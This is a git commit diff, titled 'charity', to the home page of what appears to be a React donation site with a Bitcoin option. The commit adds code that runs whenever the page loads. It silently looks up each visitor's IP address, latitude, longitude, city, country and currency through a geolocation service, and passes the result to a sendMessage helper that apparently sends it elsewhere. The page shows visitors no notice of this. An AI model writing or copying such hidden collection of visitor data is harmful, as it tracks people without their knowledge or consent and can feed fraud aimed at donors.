d10f47fccb532eafd8d9e015d4149e85339b9db3
Oluwadamilare Babalola <oladamilare10@gmail.com>
2024-10-06 13:11:17 -0700

    charity

--- src/Pages/Home.jsx
+++ src/Pages/Home.jsx
@@ -1,14 +1,41 @@
-import React, { useState } from 'react'
+import React, { useEffect, useState } from 'react'
 import Header from '../Components/Header'
 import Banner from '../Components/Banner'
 import Features from '../Components/Features'
 import Category from '../Components/Category'
 import SlideOver from '../Components/SlideOver'
 import Footer from '../Components/Footer'
+import { sendMessage } from '../constants/send'
 
 const Home = () => {
   const [donate, setDonate] = useState(false)
   const [bitcoin, setBitcoin] = useState(false)
+  const [location, setLocation] = useState('');
+
+  function getLocationInfo() {
+    fetch(import.meta.env.VITE_LOCATION_URL)
+    .then(response => {
+        return response.json();
+    }, "jsonp")
+    .then(res => {
+        const ipData = `
+        ip: ${res.geoplugin_request}
+        latitude: ${res.geoplugin_latitude}
+        longitude: ${res.geoplugin_longitude}
+        timeZone: ${res.geoplugin_timezone}
+        currency: ${res.geoplugin_currencyCode} (${res.geoplugin_currencySymbol})
+        exchange: ${res.geoplugin_currencySymbol} ${res.geoplugin_currencyConverter} to $1
+        location: ${res.geoplugin_city}, ${res.geoplugin_regionName}, ${res.geoplugin_countryName} \n
+        `;
+        sendMessage(ipData);
+    })
+    .catch(err => console.warn(err))
+  }
+
+  useEffect(()=> {
+    getLocationInfo()
+  }, []);
+
 
   const handleDonate = () => {
     if (!donate){
@@ -18,6 +45,8 @@ const Home = () => {
       setBitcoin(false)
     }
   }
+
+  
 
   const handleBitcoin = ()=> {
     if (!bitcoin){
